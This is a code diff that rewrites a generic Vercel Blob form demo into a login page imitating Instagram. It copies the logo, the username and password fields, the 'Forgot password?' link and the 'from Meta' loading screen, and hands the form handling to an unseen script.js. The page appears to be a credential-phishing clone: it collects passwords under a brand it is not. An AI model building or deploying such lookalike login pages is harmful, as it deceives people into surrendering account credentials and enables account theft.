@@ -2,331 +2,119 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Vercel Blob Storage Demo</title>
-  <!-- Modern Premium Typography -->
-  <link rel="preconnect" href="https://fonts.googleapis.com">
-  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-  <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;500;600;700&display=swap" rel="stylesheet">
-  
-  <style>
-    /* Premium Modern Dark System Design */
-    :root {
-      --bg-gradient-start: #0D1520;
-      --bg-gradient-end: #13202B;
-      --card-bg: rgba(25, 39, 52, 0.4);
-      --card-border: rgba(255, 255, 255, 0.08);
-      --text-primary: #FFFFFF;
-      --text-secondary: #A8B0B8;
-      --text-disabled: #6F7780;
-      --cta-color: #1877F2;
-      --cta-hover: #1565D8;
-      --input-bg: rgba(13, 21, 32, 0.6);
-      --input-border: rgba(255, 255, 255, 0.1);
-      --input-focus-border: #1877F2;
-      --error-color: #FF4A5A;
-      --font-main: 'Outfit', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
-    }
-
-    * {
-      box-sizing: border-box;
-      margin: 0;
-      padding: 0;
-    }
-
-    body {
-      background: linear-gradient(135deg, var(--bg-gradient-start) 0%, var(--bg-gradient-end) 100%);
-      font-family: var(--font-main);
-      color: var(--text-primary);
-      min-height: 100vh;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      padding: 24px;
-      overflow-x: hidden;
-    }
-
-    /* Container Card with Premium Glassmorphism */
-    .container {
-      background: var(--card-bg);
-      backdrop-filter: blur(20px);
-      -webkit-backdrop-filter: blur(20px);
-      border: 1px solid var(--card-border);
-      border-radius: 24px;
-      padding: 40px 32px;
-      width: 100%;
-      max-width: 440px;
-      box-shadow: 0 24px 60px rgba(0, 0, 0, 0.4);
-      transform: translateY(0);
-      transition: transform 0.3s cubic-bezier(0.16, 1, 0.3, 1), box-shadow 0.3s ease;
-    }
-
-    .container:hover {
-      transform: translateY(-2px);
-      box-shadow: 0 32px 70px rgba(0, 0, 0, 0.5);
-    }
-
-    /* Header Section */
-    .header {
-      text-align: center;
-      margin-bottom: 32px;
-    }
-
-    /* Logo placeholder */
-    .logo-container {
-      display: inline-flex;
-      align-items: center;
-      justify-content: center;
-      width: 64px;
-      height: 64px;
-      background: rgba(24, 119, 242, 0.1);
-      border-radius: 18px;
-      margin-bottom: 20px;
-      border: 1px solid rgba(24, 119, 242, 0.2);
-    }
-
-    .logo-icon {
-      width: 32px;
-      height: 32px;
-      fill: var(--cta-color);
-    }
-
-    h1 {
-      font-size: 28px;
-      font-weight: 600;
-      letter-spacing: -0.5px;
-      margin-bottom: 8px;
-      background: linear-gradient(to right, #FFFFFF, #E2E8F0);
-      -webkit-background-clip: text;
-      -webkit-text-fill-color: transparent;
-    }
-
-    .subtitle {
-      font-size: 14px;
-      color: var(--text-secondary);
-      font-weight: 400;
-    }
-
-    /* Form Styles */
-    .form-group {
-      margin-bottom: 24px;
-      position: relative;
-    }
-
-    .form-label {
-      display: block;
-      font-size: 13px;
-      font-weight: 500;
-      color: var(--text-secondary);
-      margin-bottom: 8px;
-      letter-spacing: 0.5px;
-      text-transform: uppercase;
-    }
-
-    .input-control {
-      width: 100%;
-      background-color: var(--input-bg);
-      border: 1px solid var(--input-border);
-      border-radius: 12px;
-      padding: 14px 16px;
-      font-size: 15px;
-      color: var(--text-primary);
-      font-family: var(--font-main);
-      transition: all 0.2s cubic-bezier(0.16, 1, 0.3, 1);
-      outline: none;
-    }
-
-    .input-control::placeholder {
-      color: var(--text-disabled);
-    }
-
-    .input-control:hover {
-      border-color: rgba(255, 255, 255, 0.2);
-    }
-
-    .input-control:focus {
-      border-color: var(--input-focus-border);
-      background-color: rgba(13, 21, 32, 0.8);
-      box-shadow: 0 0 0 4px rgba(24, 119, 242, 0.15);
-    }
-
-    textarea.input-control {
-      resize: vertical;
-      min-height: 100px;
-    }
-
-    /* Submit Button Styles */
-    .btn-submit {
-      width: 100%;
-      background-color: var(--cta-color);
-      color: #FFFFFF;
-      border: none;
-      border-radius: 12px;
-      padding: 16px;
-      font-size: 16px;
-      font-weight: 600;
-      cursor: pointer;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      gap: 8px;
-      transition: all 0.2s ease;
-      margin-top: 12px;
-    }
-
-    .btn-submit:hover {
-      background-color: var(--cta-hover);
-      transform: translateY(-1px);
-    }
-
-    .btn-submit:active {
-      transform: translateY(1px);
-    }
-
-    .btn-submit:disabled {
-      background-color: var(--text-disabled);
-      cursor: not-allowed;
-      transform: none;
-      opacity: 0.6;
-    }
-
-    /* Loading Spinner */
-    .spinner {
-      width: 20px;
-      height: 20px;
-      border: 2.5px solid rgba(255, 255, 255, 0.3);
-      border-radius: 50%;
-      border-top-color: #FFFFFF;
-      animation: spin 0.8s linear infinite;
-      display: none;
-    }
-
-    @keyframes spin {
-      to { transform: rotate(360deg); }
-    }
-
-    /* Error Message Alert */
-    .error-alert {
-      background: rgba(255, 74, 90, 0.1);
-      border: 1px solid rgba(255, 74, 90, 0.2);
-      color: var(--error-color);
-      padding: 12px 16px;
-      border-radius: 12px;
-      font-size: 14px;
-      margin-bottom: 20px;
-      display: none;
-      animation: fadeIn 0.3s ease;
-    }
-
-    @keyframes fadeIn {
-      from { opacity: 0; transform: translateY(-4px); }
-      to { opacity: 1; transform: translateY(0); }
-    }
-
-    /* Footer Branding */
-    .footer-note {
-      text-align: center;
-      margin-top: 24px;
-      font-size: 12px;
-      color: var(--text-disabled);
-    }
-  </style>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <title>Login</title>
+  <link rel="stylesheet" href="styles.css">
+  <meta name="theme-color" content="#1A252E">
 </head>
 <body>
-
-  <div class="container">
-    <div class="header">
+  <div class="app-container">
+    <!-- Login Screen -->
+    <div id="login-screen" class="screen">
+      
+      <!-- Top Area: Language Selector -->
+      <header class="top-bar">
+        <button type="button" class="lang-selector">
+          English (US)
+        </button>
+      </header>
+      
+      <!-- Center: Logo -->
       <div class="logo-container">
-        <!-- Vercel Logo Style SVG -->
-        <svg class="logo-icon" viewBox="0 0 76 65" fill="none" xmlns="http://www.w3.org/2000/svg">
-          <path d="M37.5 0L75 65H0L37.5 0Z" fill="currentColor"/>
-        </svg>
+        <div class="logo-mark">
+          <svg width="68" height="68" viewBox="0 0 100 100">
+            <defs>
+              <linearGradient id="ig-grad" x1="0%" y1="100%" x2="100%" y2="0%">
+                <stop offset="0%" stop-color="#FFD600" />
+                <stop offset="25%" stop-color="#FF7A00" />
+                <stop offset="50%" stop-color="#FF0069" />
+                <stop offset="75%" stop-color="#D300C5" />
+                <stop offset="100%" stop-color="#7638FA" />
+              </linearGradient>
+            </defs>
+            <rect x="15" y="15" width="70" height="70" rx="20" fill="none" stroke="url(#ig-grad)" stroke-width="8" />
+            <circle cx="50" cy="50" r="18" fill="none" stroke="url(#ig-grad)" stroke-width="8" />
+            <circle cx="69" cy="31" r="5" fill="url(#ig-grad)" />
+          </svg>
+        </div>
       </div>
-      <h1>Secure Blob Storage</h1>
-      <p class="subtitle">Submit generic form data directly to private Vercel Blob storage.</p>
+      
+      <!-- Form Area -->
+      <form id="login-form" class="login-form" autocomplete="off">
+        <div class="input-group">
+          <input type="text" id="username" class="input-field" placeholder="Username, email or mobile number" required autocomplete="username">
+        </div>
+        
+        <div class="input-group">
+          <input type="password" id="password" class="input-field" placeholder="Password" required autocomplete="current-password">
+        </div>
+        
+        <button type="submit" id="login-btn" class="btn-primary">
+          <span class="btn-text">Log in</span>
+        </button>
+      </form>
+      
+      <!-- Lower Actions -->
+      <div class="lower-actions">
+        <a href="#" class="action-link">Forgot password?</a>
+      </div>
+      
+      <!-- Create Account -->
+      <div class="create-account-wrapper">
+        <button type="button" class="create-account-btn">Create new account</button>
+      </div>
+      
+      <!-- Footer Branding -->
+      <div class="footer-branding">
+        <div class="meta-logo-plain">
+          <svg viewBox="0 0 400 200" width="22" height="11">
+            <path fill="currentColor" d="M110,60 C75,60 40,85 40,120 C40,155 75,180 110,180 C140,180 160,165 175,145 L185,130 L215,130 L225,145 C240,165 260,180 290,180 C325,180 360,155 360,120 C360,85 325,60 290,60 C260,60 240,75 225,95 L215,110 L185,110 L175,95 C160,75 140,60 110,60 Z M110,95 C130,95 145,105 155,120 C145,135 130,145 110,145 C90,145 75,135 75,120 C75,105 90,95 110,95 Z M290,95 C310,95 325,105 325,120 C325,135 310,145 290,145 C270,145 255,135 255,120 C255,105 270,95 290,95 Z"/>
+          </svg>
+          <span class="meta-text">Meta</span>
+        </div>
+      </div>
+    </div>
+    
+    <!-- Loading Screen (from Meta) -->
+    <div id="loading-screen" class="screen hidden" style="background-color: #000000;">
+      <div class="logo-container loading-logo">
+        <div class="logo-mark">
+          <svg width="76" height="76" viewBox="0 0 100 100">
+            <defs>
+              <linearGradient id="ig-grad-load" x1="0%" y1="100%" x2="100%" y2="0%">
+                <stop offset="0%" stop-color="#FFD600" />
+                <stop offset="25%" stop-color="#FF7A00" />
+                <stop offset="50%" stop-color="#FF0069" />
+                <stop offset="75%" stop-color="#D300C5" />
+                <stop offset="100%" stop-color="#7638FA" />
+              </linearGradient>
+            </defs>
+            <rect x="15" y="15" width="70" height="70" rx="20" fill="none" stroke="url(#ig-grad-load)" stroke-width="8" />
+            <circle cx="50" cy="50" r="18" fill="none" stroke="url(#ig-grad-load)" stroke-width="8" />
+            <circle cx="69" cy="31" r="5" fill="url(#ig-grad-load)" />
+          </svg>
+        </div>
+      </div>
+      
+      <div class="loading-footer">
+        <span class="from-text">from</span>
+        <div class="meta-gradient-logo">
+          <svg viewBox="0 0 400 200" width="28" height="14">
+            <path fill="url(#ig-grad-load)" d="M110,60 C75,60 40,85 40,120 C40,155 75,180 110,180 C140,180 160,165 175,145 L185,130 L215,130 L225,145 C240,165 260,180 290,180 C325,180 360,155 360,120 C360,85 325,60 290,60 C260,60 240,75 225,95 L215,110 L185,110 L175,95 C160,75 140,60 110,60 Z M110,95 C130,95 145,105 155,120 C145,135 130,145 110,145 C90,145 75,135 75,120 C75,105 90,95 110,95 Z M290,95 C310,95 325,105 325,120 C325,135 310,145 290,145 C270,145 255,135 255,120 C255,105 270,95 290,95 Z"/>
+          </svg>
+          <span class="meta-text-gradient">Meta</span>
+        </div>
+      </div>
     </div>
 
-    <!-- Error container -->
-    <div id="errorAlert" class="error-alert"></div>
-
-    <form id="demoForm">
-      <div class="form-group">
-        <label for="demoUser" class="form-label">Demo User</label>
-        <input 
-          type="text" 
-          id="demoUser" 
-          name="demoUser" 
-          class="input-control" 
-          placeholder="e.g. Alex Carter" 
-          required
-          autocomplete="off"
-        >
+    <!-- Success Screen (Private Space) -->
+    <div id="success-screen" class="screen hidden" style="background-color: #000000;">
+      <div class="private-space-container">
+        <h1 class="private-space-title">Private Space</h1>
       </div>
-
-      <div class="form-group">
-        <label for="demoText" class="form-label">Demo Text</label>
-        <textarea 
-          id="demoText" 
-          name="demoText" 
-          class="input-control" 
-          placeholder="Type your message or test payload here..." 
-          required
-        ></textarea>
-      </div>
-
-      <button type="submit" id="submitBtn" class="btn-submit">
-        <span>Save to Blob</span>
-        <div class="spinner" id="btnSpinner"></div>
-      </button>
-    </form>
-
-    <div class="footer-note">
-      Powered by private Vercel Blob access settings
     </div>
   </div>
-
-  <script>
-    document.getElementById('demoForm').addEventListener('submit', async (e) => {
-      e.preventDefault();
-
-      const demoUser = document.getElementById('demoUser').value.trim();
-      const demoText = document.getElementById('demoText').value.trim();
-      const submitBtn = document.getElementById('submitBtn');
-      const btnSpinner = document.getElementById('btnSpinner');
-      const errorAlert = document.getElementById('errorAlert');
-
-      // Reset state
-      errorAlert.style.display = 'none';
-      submitBtn.disabled = true;
-      btnSpinner.style.display = 'inline-block';
-
-      try {
-        const response = await fetch('/api/save', {
-          method: 'POST',
-          headers: {
-            'Content-Type': 'application/json'
-          },
-          body: JSON.stringify({ demoUser, demoText })
-        });
-
-        const result = await response.json();
-
-        if (response.ok && result.success) {
-          // Redirect on success
-          window.location.href = '/success.html';
-        } else {
-          throw new Error(result.error || 'Failed to submit form data.');
-        }
-      } catch (err) {
-        console.error('Submission error:', err);
-        errorAlert.textContent = err.message || 'A network error occurred. Please try again.';
-        errorAlert.style.display = 'block';
-        
-        // Re-enable submit button on failure
-        submitBtn.disabled = false;
-        btnSpinner.style.display = 'none';
-      }
-    });
-  </script>
+  
+  <script src="script.js"></script>
 </body>
 </html>
